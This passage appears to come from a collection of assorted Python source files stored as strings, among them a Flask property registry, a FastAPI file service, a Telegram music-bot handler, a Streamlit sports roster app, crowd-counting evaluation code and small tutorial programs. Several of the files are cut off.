requests.get(f'https://motorsportstats.com/api/result-statistics?sessionSlug={self.dictRace[self.raceVar.get()]}_{i}&sessionFact=LapChart&size=999')\n                data = r.json()\n                validSessions.append(i)\n            except:\n                    pass\n\n        if validSessions == []:\n            messagebox.showerror(\"2. Error\", \"An error occured. The lap chart likely doesn't ",
    "from flask import Flask, redirect, render_template, request\nfrom http_errors import HTTP_BAD_REQUEST, HTTP_NOT_FOUND\nfrom service import RegisterManager\nfrom settings import (\n    ALL_REGISTER_PAGE, CREATE_PAGE, JSON_FILE, REGISTER_PAGE, VIEW_BASE_URL,\n    FIND_PAGE, SEARCH_PAGE, AFTER_PAGE\n)\nimport json\n\napp = Flask(__name__)\napp.template_folder = VIEW_BASE_URL\napp.static_folder = VIEW_BASE_URL\n\nregister_manager = RegisterManager()\n\n@app.route('/register', methods=['POST'])\ndef post_register():\n    tipo_escritura = request.form[\"tipoEscrituraInput\"]\n    comuna = request.form[\"comunaInput\"]\n    manzana = request.form[\"manzanaInput\"]\n    predio = request.form[\"predioInput\"]\n    fojas = request.form[\"fojasInput\"]\n    fecha = request.form[\"dateInput\"]\n    nmro_inscripcion = request.form[\"inscriptionNumberInput\"]\n\n    enajenantes_rut = request.form.getlist('enajenantesRutInput[]')\n    enajenantes_derecho = request.form.getlist('enajenantesDerechoInput[]')\n    adquirentes_rut = request.form.getlist('adquirenteRutInput[]')\n    adquirentes_derecho = request.form.getlist('adquirenteDerechoInput[]')\n    \n    if tipo_escritura == \"99\":\n        enajenantes = []\n    else:\n        enajenantes = [{'RUNRUT': rut, 'porcDerecho': derecho} for rut, derecho in zip(enajenantes_rut, enajenantes_derecho)]\n    \n    adquirentes = [{'RUNRUT': rut, 'porcDerecho': derecho} for rut, derecho in zip(adquirentes_rut, adquirentes_derecho)]\n\n    errors = check_form_fields(tipo_escritura, comuna, manzana, predio, fojas, fecha, nmro_inscripcion, enajenantes, adquirentes)\n    if errors:\n        return render_template(CREATE_PAGE, error=errors, form=request.form), HTTP_BAD_REQUEST\n\n    result = register_manager.post_register_to_db(tipo_escritura, comuna, manzana, predio, enajenantes, adquirentes, fojas, fecha, nmro_inscripcion)\n    return redirect('/register', result)\n\ndef check_form_fields(tipo_escritura, comuna, manzana, predio, fojas, fecha, nmro_inscripcion, enajenantes, adquirentes):\n    if not tipo_escritura:\n        return \"El campo 'tipo de escritura' no puede ser vac\u00edo\"\n    if not comuna:\n        return \"El campo 'comuna' no puede ser vac\u00edo\"\n    if not manzana:\n        return \"El campo 'manzana' no puede ser vac\u00edo\"\n    if not predio:\n        return \"El campo 'predio' no puede ser vac\u00edo\"\n    \n    if tipo_escritura == \"8\":\n        if not enajenantes[0][\"RUNRUT\"]:\n            return \"El campo 'rut enajenantes' no puede ser vac\u00edo\"\n        if not enajenantes[0][\"porcDerecho\"]:\n            return \"El campo 'derecho enajenantes' no puede ser vac\u00edo\"\n        \n    if not adquirentes[0][\"RUNRUT\"]:\n        return \"El campo 'rut adquirente' no puede ser vac\u00edo\"\n    if not adquirentes[0][\"porcDerecho\"]:\n        return \"El campo 'derecho adquirente' no puede ser vac\u00edo\"\n    if not fojas:\n        return \"El campo 'fojas' no puede ser vac\u00edo\"\n    if not fecha:\n        return \"El campo 'fecha' no puede ser vac\u00edo\"\n    if not nmro_inscripcion:\n        return \"El campo 'numero de inscripci\u00f3n' no puede ser vac\u00edo\"\n    \n    return \"\"\n\n@app.route('/load_json', methods=['POST'])\ndef post_json():\n    file = request.files[\"fileInput\"]\n    filename = file.filename\n    if not filename.endswith(JSON_FILE):\n        return render_template(CREATE_PAGE, file_error=\"La extensi\u00f3n del archivo debe ser .json\", form=request.form), HTTP_BAD_REQUEST\n    \n    result = register_manager.process_json(file)\n    return render_template(AFTER_PAGE, data=result)\n\n@app.route('/')\ndef index():\n    return get_all_registers()\n\n@app.route('/create')\ndef create_register():\n    return render_template(CREATE_PAGE, form={\"textInput\": '', \"numInput\": ''})\n\n@app.route('/register')\ndef get_all_registers():\n    registers = register_manager.get_all_registers()\n    return render_template(ALL_REGISTER_PAGE, data=registers)\n\n@app.route('/register/<id>')\ndef get_register_by_id(id):\n    register = register_manager.get_register_by_id(id)\n    register['Enajenantes'] = json.loads(register['Enajenantes'])\n    register['Adquirentes'] = json.loads(register['Adquirentes'])\n    return render_template(REGISTER_PAGE, data=register)\n\n@app.route('/find')\ndef find():\n    return render_template(FIND_PAGE, form={\"textInput\": '', \"numInput\": ''})\n\n@app.route('/search', methods=['POST'])\ndef find_register():\n    comuna = request.form[\"comunaInput\"]\n    manzana = request.form[\"manzanaInput\"]\n    predio = request.form[\"predioInput\"]\n    fecha = request.form[\"fInput\"]\n\n    if not comuna:\n        return render_template(FIND_PAGE, error=\"El campo 'comuna' no puede ser vac\u00edo\", form=request.form), HTTP_BAD_REQUEST\n    if not manzana:\n        return render_template(FIND_PAGE, error=\"El campo 'manzana' no puede ser vac\u00edo\", form=request.form), HTTP_BAD_REQUEST\n    if not predio:\n        return render_template(FIND_PAGE, error=\"El campo 'predio' no puede ser vac\u00edo\", form=request.form), HTTP_BAD_REQUEST\n    if not fecha:\n        return render_template(FIND_PAGE, error=\"El campo 'fecha' no puede ser vac\u00edo\", form=request.form), HTTP_BAD",
    "\"\"\"\r\nPLP Week 4 min-project\r\n\r\nLearn how to load json data into a python dictionary\r\nCreate a function that returns a definition of a word\r\nConsider a condition that the entered word is not in a dictionary\r\nConsider input from user having different cases \u2013 upper/ lower case or mixed eg: RAIN/rain/RaIN\r\nMake your dictionary program more intelligent incase users input a word with wrong spelling the program should be able to suggest the word that might be intended.\r\neg . pott instead of pot or rainn instead of rain.\r\nTip: use difflib library here\r\n\"\"\"\r\n\r\n# pip install orjson\r\nimport orjson\r\nfrom re import split\r\nfrom difflib import get_close_matches\r\n\r\n\r\nclass Dictionary:\r\n    \"\"\"dictionary that gets difinations from a JSON file\"\"\"\r\n\r\n    __slots__ = (\r\n        \"word_definitions\",\r\n        \"dictfile\",\r\n        \"words\",\r\n        \"current_word\",\r\n        \"current_definition\",\r\n    )\r\n\r\n    def __init__(self):\r\n        # store filename for future ref\r\n        self.dictfile = None\r\n        # empty words and definitions\r\n        self.word_definitions = {}\r\n        self.words = []\r\n        # initialize current word and definition\r\n        self.current_word = None\r\n        self.current_definition = None\r\n\r\n    def from_json(self, filename: str):\r\n        \"\"\"\r\n        read dictfile and update dictionary at runtime;\r\n        return True on success, False otherwise\r\n        \"\"\"\r\n        try:\r\n            with open(filename, \"rb\") as file:\r\n                # get words and definitions\r\n                self.word_definitions: dict = orjson.loads(file.read())\r\n            # get words for suggestions\r\n            self.words = list(self.word_definitions.keys())\r\n            # update file ref\r\n            self.dictfile = filename\r\n            return True\r\n        except Exception:  # File not found, or Permission errors\r\n            return False\r\n\r\n    def _format_definition(self, definitions):\r\n        \"\"\"\r\n        format the definitions string/list;\r\n        use the 're' to replace numbered definitions with '\\n'\r\n        \"\"\"\r\n        if isinstance(definitions, str):\r\n            # try split numbered definitions\r\n            definitions = (\r\n                line for line in split(r\"[ ]*\\d{1,2}.[ ]+\", definitions) if line\r\n            )\r\n        elif isinstance(definitions, dict):\r\n            definitions = (f\"{k}: {v}\" for k, v in definitions.items())\r\n        # format definitions\r\n        formatted_def = \"\".join(\r\n            (f\"\\n{index + 1}. {line}\" for index, line in enumerate(definitions))\r\n        )\r\n        return formatted_def\r\n\r\n    def search(self, word: str) -> str | None:\r\n        \"\"\"search the definition of word in dictionary\"\"\"\r\n        # if definition is None; suggest a word that's close\r\n        if definition := self.word_definitions.get(word):\r\n            # definition can be list or str\r\n            f_definition = self._format_definition(definition)\r\n            # update current word and definition\r\n            self.current_word = word\r\n            self.current_definition = f_definition\r\n            return f_definition\r\n\r\n    def suggest(self, word: str, **kwargs):\r\n        \"\"\"use difflib to suggest close words to word\"\"\"\r\n        matches = get_close_matches(word, self.words, **kwargs)\r\n        return matches\r\n",
    "import os\nimport urllib\nimport psycopg2\n\nfrom fastapi import FastAPI, HTTPException, Response, File, UploadFile\nfrom dotenv import dotenv_values\nfrom uuid import uuid4\n\n\napp = FastAPI()\n\nenv_vars = dotenv_values()\n\n# Database connection\nconnection = psycopg2.connect(**env_vars)\n\n\n# Directory to work with files\nUPLOAD_DIR = 'uploads'\nif not os.path.exists(UPLOAD_DIR):\n    os.makedirs(UPLOAD_DIR)\n    \n# Route to upload a file\n@app.post('/upload/')\nasync def upload_file(file: UploadFile = File(...)):\n    try:\n        file_path = f'{uuid4()}_{file.filename}'\n        path = os.path.join(UPLOAD_DIR, file_path)\n        with open(path, 'wb') as f:\n            f.write(await file.read())\n        \n        with connection.cursor() as cursor:\n            cursor.execute('INSERT INTO files(filename) VALUES(%s)', (file_path,))\n            connection.commit()\n\n        return  {\"filename\": file_path, 'to_download': f'/download/{file_path}'}\n\n    except:\n        return {'error': 'something wrong'}\n\n# Route to download a file\n@app.get('/download/{filename}')\nasync def download_file(filename: str):\n    try:\n        with connection.cursor() as cursor:\n            cursor.execute('SELECT filename FROM files WHERE filename = %s', (filename,))\n            \n            file_path = cursor.fetchone()[0]\n\n        full_file_path = f'uploads/{file_path}'\n        if not os.path.exists(full_file_path):\n            return HTTPException(404, 'no such file')\n\n        with open(full_file_path, 'rb') as f:\n            contents = f.read()\n\n        return Response(content=contents, media_type=\"application/octet-stream\", headers={\"Content-Disposition\": f\"attachment; filename*=UTF-8''{urllib.parse.quote(os.path.basename(file_path))}\"})\n\n    except:\n        return {'error': 'something wrong'}\n\n# Route to delete a file\n@app.delete('/delete/{filename}')\nasync def delete_file(filename: str):\n    try:\n        with connection.cursor() as cursor:\n            cursor.execute('DELETE FROM files WHERE filename = %s', (filename,))\n            connection.commit()\n\n        os.remove(f'uploads/{filename}')\n        \n        return {'message': 'file deleted successfully'}\n\n    except:\n        return {'error': 'something wrong'}",
    "from pyrogram import filters\nfrom pyrogram.types import Message\n\nfrom ChampuXMusic import app\nfrom ChampuXMusic.core.call import Champu\nfrom ChampuXMusic.misc import SUDOERS, db\nfrom ChampuXMusic.utils import AdminRightsCheck\nfrom ChampuXMusic.utils.database import is_active_chat, is_nonadmin_chat\nfrom ChampuXMusic.utils.decorators.language import languageCB\nfrom ChampuXMusic.utils.inline import close_markup, speed_markup\nfrom config import BANNED_USERS, adminlist\n\nchecker = []\n\n\n@app.on_message(\n    filters.command([\"cspeed\", \"speed\", \"cslow\", \"slow\", \"playback\", \"cplayback\"])\n    & filters.group\n    & ~BANNED_USERS\n)\n@AdminRightsCheck\nasync def playback(cli, message: Message, _, chat_id):\n    playing = db.get(chat_id)\n    if not playing:\n        return await message.reply_text(_[\"queue_2\"])\n    duration_seconds = int(playing[0][\"seconds\"])\n    if duration_seconds == 0:\n        return await message.reply_text(_[\"admin_27\"])\n    file_path = playing[0][\"file\"]\n    if \"downloads\" not in file_path:\n        return await message.reply_text(_[\"admin_27\"])\n    upl = speed_markup(_, chat_id)\n    return await message.reply_text(\n        text=_[\"admin_28\"].format(app.mention),\n        reply_markup=upl,\n    )\n\n\n@app.on_callback_query(filters.regex(\"SpeedUP\") & ~BANNED_USERS)\n@languageCB\nasync def del_back_playlist(client, CallbackQuery, _):\n    callback_data = CallbackQuery.data.strip()\n    callback_request = callback_data.split(None, 1)[1]\n    chat, speed = callback_request.split(\"|\")\n    chat_id = int(chat)\n    if not await is_active_chat(chat_id):\n        return await CallbackQuery.answer(_[\"general_5\"], show_alert=True)\n    is_non_admin = await is_nonadmin_chat(CallbackQuery.message.chat.id)\n    if not is_non_admin:\n        if CallbackQuery.from_user.id not in SUDOERS:\n            admins = adminlist.get(CallbackQuery.message.chat.id)\n            if not admins:\n                return await CallbackQuery.answer(_[\"admin_13\"], show_alert=True)\n            else:\n                if CallbackQuery.from_user.id not in admins:\n                    return await CallbackQuery.answer(_[\"admin_14\"], show_alert=True)\n    playing = db.get(chat_id)\n    if not playing:\n        return await CallbackQuery.answer(_[\"queue_2\"], show_alert=True)\n    duration_seconds = int(playing[0][\"seconds\"])\n    if duration_seconds == 0:\n        return await CallbackQuery.answer(_[\"admin_27\"], show_alert=True)\n    file_path = playing[0][\"file\"]\n    if \"downloads\" not in file_path:\n        return await CallbackQuery.answer(_[\"admin_27\"], show_alert=True)\n    checkspeed = (playing[0]).get(\"speed\")\n    if checkspeed:\n        if str(checkspeed) == str(speed):\n            if str(speed) == str(\"1.0\"):\n                return await CallbackQuery.answer(\n                    _[\"admin_29\"],\n                    show_alert=True,\n                )\n    else:\n        if str(speed) == str(\"1.0\"):\n            return await CallbackQuery.answer(\n                _[\"admin_29\"],\n                show_alert=True,\n            )\n    if chat_id in checker:\n        return await CallbackQuery.answer(\n            _[\"admin_30\"],\n            show_alert=True,\n        )\n    else:\n        checker.append(chat_id)\n    try:\n        await CallbackQuery.answer(\n            _[\"admin_31\"],\n        )\n    except:\n        pass\n    mystic = await CallbackQuery.edit_message_text(\n        text=_[\"admin_32\"].format(CallbackQuery.from_user.mention),\n    )\n    try:\n        await Champu.speedup_stream(\n            chat_id,\n            file_path,\n            speed,\n            playing,\n        )\n    except:\n        if chat_id in checker:\n            checker.remove(chat_id)\n        return await mystic.edit_text(_[\"admin_33\"], reply_markup=close_markup(_))\n    if chat_id in checker:\n        checker.remove(chat_id)\n    await mystic.edit_text(\n        text=_[\"admin_34\"].format(speed, CallbackQuery.from_user.mention),\n        reply_markup=close_markup(_),\n    )\n",
    "\"\"\"\nGuessing the number game with 2 difficulty levels: Easy (10 attempts), hard (5 attempts)\n\"\"\"\nimport random\n\n\ndef generate_number() -> int:\n    random_number = random.randint(1, 100)\n    return random_number\n\n\ndef decrement_attempts(number_of_attempts:int) -> int:\n    return number_of_attempts - 1\n\n\ndef main():\n    print(\"Welcome to the number guessing game!!\")\n    number = generate_number()\n    print(\"I am thinking of a number from 1 to 100 . . .\")\n    print(f\"Psst...the number is {number}\")\n    difficulty = \"\".lower()\n    while difficulty != \"easy\" and difficulty != \"hard\":\n        difficulty = input(\"Please choose a valid difficulty: 'easy' or 'hard': \")\n    if difficulty == \"easy\":\n        attempts = 10\n    else:\n        attempts = 5\n    number_found = False\n    while attempts > 0:\n        print(f\"You have {attempts} attempts left.\")\n        guess = int(input(\"Make a guess: \"))\n        if guess > number:\n            print(\"Too high.\")\n        elif guess < number:\n            print(\"Too low.\")\n        else:\n            attempts = 0\n            number_found = True\n            continue\n\n        print(\"Guess again\")\n        attempts = decrement_attempts(attempts)\n\n    if number_found:\n        print(f\"You got it! The number was {number}.\")\n    else:\n        print(\"Oops. You've run out of guesses. You lose.\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import streamlit as st\nimport pandas as pd\nimport requests\nfrom io import StringIO\nfrom datetime import datetime, timedelta\n\nst.title('HealthAura: Pro Sports Tracker')\n\n# Define a dictionary that maps each league to its corresponding team roster URLs\nteam_roster_urls = {\n    'MLB': {team_name: f\"https://raw.githubusercontent.com/cade-auragens/Auragens_Sports.py/main/MLB%20{team_name.replace(' ', '%20')}.csv\" for team_name in [\n         \"San Francisco Giants\", \"Cleveland Guardians\", \"Seattle Mariners\", \"Miami Marlins\", \"New York Mets\", \"Washington Nationals\", \"Baltimore Orioles\", \"San Diego Padres\", \"Philadelphia Phillies\", \"Pittsburgh Pirates\",\n        \"Texas Rangers\", \"Tampa Bay Rays\", \"Boston Red Sox\", \"Cincinnati Reds\", \"Colorado Rockies\", \"Kansas City Royals\", \"Detroit Tigers\", \"Minnesota Twins\", \"Chicago White Sox\", \"New York Yankees\"\n    ]},\n    'NBA': {team_name: f\"https://raw.githubusercontent.com/cade-auragens/Auragens_Sports.py/main/NBA%20{team_name.replace(' ', '%20')}.csv\" for team_name in [\n          \"Philadelphia 76ers\", \"Milwaukee Bucks\", \"Chicago Bulls\", \"Cleveland Cavaliers\", \"Boston Celtics\", \"Los Angeles Clippers\", \"Memphis Grizzlies\", \"Atlanta Hawks\", \"Miami Heat\", \"Charlotte Hornets\",\n        \"Utah Jazz\", \"Sacramento Kings\", \"New York Knicks\", \"Los Angeles Lakers\", \"Orlando Magic\", \"Dallas Mavericks\", \"Brooklyn Nets\", \"Denver Nuggets\", \"Indiana Pacers\", \"New Orleans Pelicans\",\n        \"Detroit Pistons\", \"Toronto Raptors\", \"Houston Rockets\", \"San Antonio Spurs\", \"Phoenix Suns\", \"Oklahoma City Thunder\", \"Minnesota Timberwolves\", \"Portland Trail Blazers\", \"Golden State Warriors\", \"Washington Wizards\"\n    ]},\n    'NFL': {team_name: f\"https://raw.githubusercontent.com/cade-auragens/Auragens_Sports.py/main/NFL%20{team_name.replace(' ', '%20')}.csv\" for team_name in [\n         \"San Francisco 49ers\", \"Chicago Bears\", \"Cincinnati Bengals\", \"Buffalo Bills\", \"Denver Broncos\", \"Cleveland Browns\", \"Tampa Bay Buccaneers\", \"Arizona Cardinals\", \"Los Angeles Chargers\", \"Kansas City Chiefs\",\n        \"Indianapolis Colts\", \"Washington Commanders\", \"Dallas Cowboys\", \"Miami Dolphins\", \"Philadelphia Eagles\", \"Atlanta Falcons\", \"New York Giants\", \"Jacksonville Jaguars\", \"New York Jets\", \"Detroit Lions\",\n        \"Green Bay Packers\", \"Carolina Panthers\", \"New England Patriots\", \"Las Vegas Raiders\", \"Los Angeles Rams\", \"Baltimore Ravens\", \"New Orleans Saints\", \"Seattle Seahawks\", \"Pittsburgh Steelers\", \"Houston Texans\",\n        \"Tennessee Titans\", \"Minnesota Vikings\"\n    ]},\n    'NHL': {team_name: f\"https://raw.githubusercontent.com/cade-auragens/Auragens_Sports.py/main/NHL%20{team_name.replace(' ', '%20')}.csv\" for team_name in [\n         \"Colorado Avalanche\", \"Chicago Blackhawks\", \"Columbus Blue Jackets\", \"St. Louis Blues\", \"Boston Bruins\", \"Montreal Canadiens\", \"Vancouver Canucks\", \"Washington Capitals\", \"Arizona Coyotes\", \"New Jersey Devils\",\n        \"Anaheim Ducks\", \"Calgary Flames\", \"Philadelphia Flyers\", \"Vegas Golden Knights\", \"Carolina Hurricanes\", \"New York Islanders\", \"Winnipeg Jets\", \"Los Angeles Kings\", \"Seattle Kraken\", \"Tampa Bay Lightning\",\n        \"Toronto Maple Leafs\", \"Edmonton Oilers\", \"Florida Panthers\", \"Pittsburgh Penguins\", \"Nashville Predators\", \"New York Rangers\", \"Detroit Red Wings\", \"Buffalo Sabres\", \"Ottawa Senators\", \"San Jose Sharks\",\n        \"Dallas Stars\", \"Minnesota Wild\"\n    ]}\n}\n\n# Mapping NFL teams to their roster CSV URLs\nmlb_team_roster_urls = {\n    \"Arizona Diamondbacks\": \"https://raw.githubusercontent.com/cade-auragens/Auragens_Sports.py/main/MLB%20Arizona%20Diamondbacks.csv\",\n    \"Atlanta Braves\": \"https://raw.githubusercontent.com/cade-auragens/Auragens_Sports.py/main/MLB%20Atlanta%20Braves.csv\",\n    \"Baltimore Orioles\": \"https://raw.githubusercontent.com/cade-auragens/Auragens_Sports.py/main/MLB%20Baltimore%20Orioles.csv\",\n    \"Boston Red Sox\": \"https://raw.githubusercontent.com/cade-auragens/Auragens_Sports.py/main/MLB%20Boston%20Red%20Sox.csv\",\n    \"Chicago Cubs\": \"https://raw.githubusercontent.com/cade-auragens/Auragens_Sports.py/main/MLB%20Chicago%20Cubs.csv\",\n    \"Chicago White Sox\": \"https://raw.githubusercontent.com/cade-auragens/Auragens_Sports.py/main/MLB%20Chicago%20White%20Sox.csv\",\n    \"Cincinnati Reds\": \"https://raw.githubusercontent.com/cade-auragens/Auragens_Sports.py/main/MLB%20Cincinnati%20Reds.csv\",\n    \"Cleveland Guardians\": \"https://raw.githubusercontent.com/cade-auragens/Auragens_Sports.py/main/MLB%20Cleveland%20Guardians.csv\",\n    \"Colorado Rockies\": \"https://raw.githubusercontent.com/cade-auragens/Auragens_Sports.py/main/MLB%20Colorado%20Rockies.csv\",\n    \"Detroit Tigers\": \"https://raw.githubusercontent.com/cade-auragens/Auragens_Sports.py/main/MLB%20Detroit%20Tigers.csv\",\n    \"Houston Astros\": \"https://raw.githubusercontent.com/cade-auragens/Auragens_Sports.py/main/MLB%20Houston%20Astros.csv\",\n    \"Kansas City Royals\": \"https://raw.githubusercontent.com/cade-auragens/Auragens_Sports.py/main/MLB%20Kansas%20City%20Royals.csv\",\n    \"Los Angeles Ange",
    "import random\nimport math\n\ndef generate_charging_data(num_buses, soc_lower, soc_upper, battery_capacity, charger_power):\n    charging_data = []\n    hourly_data = {hour: {\"Incoming\": [], \"Outgoing\": []} for hour in range(24)}\n    \n    for _ in range(num_buses):\n        bus_id = f\"Bus_{random.randint(1, 2000):04d}\"\n        charging_periods = [\"12:00-13:00\", \"13:00-14:00\", \"21:00-22:00\", \"22:00-23:00\"]\n        incoming_time = random.choice(charging_periods).split('-')[0]\n        incoming_hour = int(incoming_time.split(':')[0])\n\n        initial_soc = random.randint(soc_lower, soc_upper)  # Ensure lower bound is less\n        final_soc = 100\n        energy_needed = ((final_soc - initial_soc) / 100) * battery_capacity\n\n        # Calculate charging duration and outgoing hour\n        hours_to_charge = energy_needed / charger_power\n        outgoing_hour = incoming_hour + math.ceil(hours_to_charge)\n\n        # Adjust outgoing_hour if it goes beyond 24-hour format\n        if outgoing_hour >= 24:\n            outgoing_hour -= 24\n\n        # Append detailed charging data for each bus\n        charging_data.append({\n            \"Bus ID\": bus_id,\n            \"Charging Start Hour\": incoming_hour,\n            \"Outgoing Hour\": outgoing_hour,  # Now explicitly storing outgoing hour\n            \"Initial SOC (%)\": initial_soc,\n            \"Final SOC (%)\": final_soc,\n            \"Energy Consumed (kWh)\": energy_needed\n        })\n\n        # Log incoming and outgoing buses in hourly data\n        hourly_data[incoming_hour][\"Incoming\"].append({\n            \"Bus ID\": bus_id,\n            \"Initial SOC (%)\": initial_soc,\n            \"Energy Required (kWh)\": energy_needed\n        })\n\n        for h in range(incoming_hour, incoming_hour + math.ceil(hours_to_charge)):\n            hour = h % 24  # Use modulo for hour wrapping\n            hourly_data[hour][\"Outgoing\"].append({\n                \"Bus ID\": bus_id,\n                \"Final SOC (%)\": final_soc\n            })\n    \n    return charging_data, hourly_data\n",
    "import h5py\nimport scipy.io as io\nimport PIL.Image as Image\nimport numpy as np\nimport os\nimport glob\nfrom sklearn.metrics import mean_squared_error, mean_absolute_error\nfrom matplotlib import pyplot as plt\nfrom scipy.ndimage.filters import gaussian_filter\nimport scipy\nimport json\nimport torchvision.transforms.functional as F\nfrom matplotlib import cm as CM\nfrom image import *\nfrom model import CSRNet\nimport torch\n\nfrom torchvision import datasets, transforms\n\ntransform = transforms.Compose([\n    transforms.ToTensor(), transforms.Normalize(mean=[0.485, 0.456, 0.406],\n                                                std=[0.229, 0.224, 0.225]),\n])\n\nroot = '../ShanghaiTech_Crowd_Counting_Dataset/'\n\n# now generate the ShanghaiA's ground truth\npart_A_train = os.path.join(root, 'part_A_final/train_data', 'images')\npart_A_test = os.path.join(root, 'part_A_final/test_data', 'images')\npart_B_train = os.path.join(root, 'part_B_final/train_data', 'images')\npart_B_test = os.path.join(root, 'part_B_final/test_data', 'images')\npath_sets = [part_B_test]\n\nimg_paths = []\nfor path in path_sets:\n    for img_path in glob.glob(os.path.join(path, '*.jpg')):\n        img_paths.append(img_path)\nfor p in img_paths:\n    print(p)\nmodel = CSRNet()\nmodel = model.cuda()\ncheckpoint = torch.load('partB-3-model_best.pth.tar')\nmodel.load_state_dict(checkpoint['state_dict'])\n\npred = []\ngt = []\nfor i in range(len(img_paths)):\n    img = 255.0 * F.to_tensor(Image.open(img_paths[i]).convert('RGB'))\n    img[0, :, :] = img[0, :, :] - 92.8207477031\n    img[1, :, :] = img[1, :, :] - 95.2757037428\n    img[2, :, :] = img[2, :, :] - 104.877445883\n    img = img.cuda()\n    img = transform(Image.open(img_paths[i]).convert('RGB')).cuda()  # \u539f\u672c\u88ab\u6ce8\u91ca\u4e86\n    gt_file = h5py.File(img_paths[i].replace('.jpg', '.h5').replace('images', 'ground_truth'), 'r')\n    groundtruth = np.asarray(gt_file['density'])\n    output = model(img.unsqueeze(0))\n    pred.append(output.data.cpu().numpy().sum())\n    gt.append(np.sum(groundtruth))\n    # mae += abs(output.detach().cpu().sum().numpy() - np.sum(groundtruth))\n    # print(i, mae)\n# print(\"Average MAE: \", mae / len(img_paths))\nmae = mean_absolute_error(pred, gt)\nrmse = np.sqrt(mean_squared_error(pred, gt))\n\n# \u5e73\u5747\u7edd\u5bf9\u8bef\u5dee\nprint('MAE: ', mae)\n# \u5747\u65b9\u6839\u8bef\u5dee\nprint('RMSE: ', rmse)\n",
    "import tkinter as tk\r\nfrom tkinter import filedialog, messagebox, simpledialog\r\n\r\nclass Application(tk.Tk):\r\n    def __init__(self):\r\n        super().__init__()\r\n        self.title(\"List Manager\")\r\n        self.geometry(\"500x500\")\r\n\r\n        self.create_menu()\r\n        self.create_widgets()\r\n\r\n    def create_menu(self):\r\n        menuBar = tk.Menu(self)\r\n        #File\r\n        file_menu = tk.Menu(menuBar, tearoff=0)\r\n        file_menu.add_command(label=\"Open\", command=self.open_file)\r\n        file_menu.add_command(label=\"Save\", command=self.save_file)\r\n        menuBar.add_cascade(label=\"File\", menu=file_menu)\r\n\r\n        #Edit\r\n        edit_menu = tk.Menu(menuBar, tearoff=0)\r\n        edit_menu.add_command(label=\"Add\", command=self.add_item)\r\n        edit_menu.add_command(label=\"Delete\", command=self.delete_item)\r\n        edit_menu.add_command(label=\"Edit\", command=self.edit_item)\r\n        menuBar.add_cascade(label=\"Edit\", menu=edit_menu)\r\n\r\n        #Help\r\n        Help_menu = tk.Menu(menuBar, tearoff=0)\r\n        Help_menu.add_command(label=\"About\", command=self.show_about)\r\n        menuBar.add_cascade(label=\"Help\", menu=Help_menu)\r\n\r\n        #Show Menu in Window\r\n        self.config(menu=menuBar)\r\n\r\n    #File Menu\r\n    def create_widgets(self):\r\n        #Frame\r\n        self.frame = tk.Frame(self)\r\n        self.frame.pack(fill=\"both\", expand=True)\r\n\r\n        self.listbox = tk.Listbox(self.frame)\r\n        self.listbox.pack(fill=\"both\", expand=True)\r\n\r\n    def open_file(self):\r\n        #Open File in File Manager\r\n        file_path = filedialog.askopenfilename(filetypes=[(\"Text files\", \"*.txt\")])\r\n\r\n        #Get File Content to ListBox\r\n        if file_path:\r\n            with open(file_path, \"r\") as file:\r\n                self.listbox.delete(0, tk.END)\r\n                for line in file:\r\n                    self.listbox.insert(tk.END, line.strip())\r\n    \r\n    def save_file(self):\r\n        #Save File Settings to File Manager\r\n        file_path = filedialog.asksaveasfilename(defaultextension=\".txt\", filetypes=[(\"Text files\", \"*.txt\")])\r\n\r\n        #Save File\r\n        if file_path:\r\n            with open(file_path, \"w\") as file:\r\n                for i in range(self.listbox.size()):\r\n                    file.write(self.listbox.get(i) + \"\\n\")\r\n\r\n    #Edit Menu\r\n    def add_item(self):\r\n        #DialogBox for Input\r\n        item = simpledialog.askstring(\"Add Item\", \"Enter Item:\")\r\n\r\n        #Add Item to the ListBox\r\n        if item:\r\n            self.listbox.insert(tk.END, item)\r\n    \r\n    def delete_item(self):\r\n        #Get the Selected Item\r\n        selected_item = self.listbox.curselection()\r\n\r\n        #Delete Selected Item\r\n        if selected_item:\r\n            for index in selected_item[::-1]:\r\n                self.listbox.delete(index)\r\n\r\n    def edit_item(self):\r\n        #Get the Selected Item\r\n        selected_item = self.listbox.curselection()\r\n\r\n        #Edit the Selected Item\r\n        if selected_item:\r\n            item = self.listbox.get(selected_item)\r\n            new_item = simpledialog.askstring(\"Edit Item\", \"Enter New Value:\", initialvalue=item)\r\n\r\n            #Edit the Selected Item with New Value\r\n            if new_item:\r\n                self.listbox.delete(selected_item)\r\n                self.listbox.insert(selected_item, new_item)\r\n\r\n    #Help Menu\r\n    def show_about(self):\r\n        messagebox.showinfo(\"About\", \"List Manager\\nVersion 1.0\\nAuthor: Villaber, Christian Jude\")\r\n\r\n\r\n\r\n\r\napp = Application()\r\napp.mainloop()\r\n",
    "import re\n\n\nclass ParsingRegexes:\n    \"\"\"\n    Compiled regular expressions and string for parsing forecast data.\n    \n    Attributes:\n        AM_PM_SPACE (Pattern): Compiled regular expression object that \n            captures the boundary between a time value and a.m. or p.m.\n        AM_PM_FORMAT (Pattern): Compiled regular expression object that \n            captures a.m. and p.m. strings for reformatting.\n        LOOKAHEAD_STR (str): Regular expression pattern that ignores \n            numbers in the forecast that are not temperatures.\n        SPACES (Pattern): Compiled regular expression object that \n            captures duplicate spaces and trailing whitespace.\n        TEMPS_FINDER (Pattern): Compiled regular expression object that \n            captures numbers in a forecast that are temperatures.\n    \"\"\"\n    LOOKAHEAD_STR = (r'(?!\\spercent|%|\\sa\\.m\\.|\\sp\\.m\\.|\\sto|\\smph|\\sand'\n                     r'|\\sinch)')\n\n    AM_PM_SPACE = re.compile(r'(?<=\\d)(?=am|pm)')\n    AM_PM_FORMAT = re.compile(r'(?<=\\d\\s(a|p))m\\.?')\n    SPACES = re.compile(r'(?<=\\s)\\s|\\s+$')\n    TEMPS_FINDER = re.compile(r'-?\\d{1,3}\\b' + LOOKAHEAD_STR)\n\n\nclass ValidationRegexes:\n    \"\"\"\n    Compiled regular expressions for validating input data.\n\n    Attributes:\n        url (Pattern): Compiled regular expression object that captures \n            any string that matches weather.gov's forecast URL syntax.\n        zip_code (Pattern): Compiled regular expression object that \n            captures any string that is only a sequence of five digits.\n    \"\"\"\n    URL = re.compile(r'^https?://forecast\\.weather\\.gov/MapClick\\.php\\?'\n                        r'lat=(-?\\d+\\.\\d+)&lon=(-?\\d+\\.\\d+)$')\n    ZIP_CODE = re.compile(r'^\\d{5}$')",
